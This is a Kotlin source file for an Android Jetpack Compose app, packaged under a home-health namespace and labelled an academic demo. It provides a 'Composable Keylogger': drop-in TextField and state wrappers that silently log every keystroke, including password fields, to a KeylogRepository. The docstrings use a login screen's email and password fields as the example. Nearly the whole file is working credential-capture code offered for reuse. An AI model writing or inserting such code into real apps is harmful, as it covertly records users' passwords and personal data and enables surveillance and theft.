package com.example.homehealth.keylogger

import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material3.TextField
import androidx.compose.material3.TextFieldDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation

/**
 * ACADEMIC DEMO: Composable Keylogger
 * 
 * Provides a drop-in replacement for TextField that automatically logs
 * all text input to the KeylogRepository.
 * 
 * Usage:
 *   val emailState = rememberKeyloggedTextState("LoginScreen", "email")
 *   KeyloggedTextField(
 *       value = emailState.value,
 *       onValueChange = { emailState.value = it },
 *       label = "Email"
 *   )
 */
object ComposableKeylogger {

    /**
     * Create a text state that logs to KeylogRepository whenever value changes.
     * Use this instead of regular mutableStateOf for text fields you want to monitor.
     *
     * @param screenName The screen/composable name (e.g., "LoginScreen", "ProfileEdit")
     * @param fieldName The field identifier (e.g., "email", "password")
     * @param initialValue Starting text value
     * @return A MutableState that logs on every change
     */
    fun <T> rememberKeyloggedState(
        screenName: String,
        fieldName: String,
        initialValue: T
    ): MutableState<T> {
        val state = mutableStateOf(initialValue)
        val repository = KeylogRepository.getInstance()

        // Wrap the original state to intercept changes
        return object : MutableState<T> by state {
            override var value: T
                get() = state.value
                set(newValue) {
                    state.value = newValue
                    // Log the change if it's a string
                    if (newValue is String) {
                        repository.log(screenName, fieldName, newValue)
                    }
                }
        }
    }

    /**
     * Drop-in replacement for TextField that logs all input.
     * Use exactly like Material3 TextField, but with automatic keylogging.
     *
     * @param value The current text
     * @param onValueChange Called when text changes (already logs automatically)
     * @param screenName The screen where this field appears
     * @param fieldName The field identifier for logging
     * @param modifier Layout modifier
     * @param label Optional label composable
     * @param placeholder Optional placeholder composable
     * @param isPassword If true, text will be masked
     */
    @Composable
    fun KeyloggedTextField(
        value: String,
        onValueChange: (String) -> Unit,
        screenName: String,
        fieldName: String,
        modifier: Modifier = Modifier,
        label: String = "",
        placeholder: String = "",
        isPassword: Boolean = false,
        keyboardOptions: KeyboardOptions = KeyboardOptions.Default
    ) {
        val repository = KeylogRepository.getInstance()

        TextField(
            value = value,
            onValueChange = { newValue ->
                onValueChange(newValue)
                // Log every keystroke
                repository.log(screenName, fieldName, newValue)
            },
            modifier = modifier,
            label = { androidx.compose.material3.Text(label) },
            placeholder = { androidx.compose.material3.Text(placeholder) },
            visualTransformation = if (isPassword) {
                PasswordVisualTransformation()
            } else {
                VisualTransformation.None
            },
            keyboardOptions = keyboardOptions,
            singleLine = true
        )
    }
}
